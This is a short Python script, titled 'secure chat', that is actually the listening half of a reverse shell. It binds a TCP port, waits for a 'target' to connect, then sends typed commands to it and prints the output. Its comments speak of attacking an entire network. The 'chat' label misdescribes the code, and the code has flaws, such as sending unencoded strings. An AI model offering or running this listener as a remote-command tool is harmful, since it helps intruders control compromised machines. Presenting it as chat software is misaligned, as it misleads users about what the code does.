			       ## =============== SECURE CHAT IN PYTHON ==================== ##
       		            ## ============ WITH MANY PROPERTISE ============= ##
   

                                            ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

                                                   #########       ###########         
                                                  ##               ##              
                                                  ##               ##              
                                                   #########   *   ##
                                                          ##       ##
                                                          ##       ##
                                                   #########       ###########

                                            ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) ## INET means family of IPv4 Address , and Sock_Stream mean connection with client with TCP protocol
s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1) # SOL_SOCKET is the socket layer itself. It is used for options that are protocol independent
                                                         # SO_REUSEADDR allows your server to bind to an address which is in a. TIME_WAIT state.
s.bind(("127.0.0.1",54321)) # You can change this address if you want to attacl on entire network. And 54321 is a random port.
s.listen(5) # mean it will only accept connections till "5" and will reject "6th" connection.
print("Listening for Incoming Connections!!!")
target ,ip=s.accept() # target is a targets sock which will be store in the memory. and IP is of target IP Address.
print("Target Connected!!!")
while True:

	message=input("* Shell~%s " %str(ip) )
	target.send(message)
	if message=="q":
	     break
	else:
	     answer=target.recv(1024)
	     print(answer)
s.close()
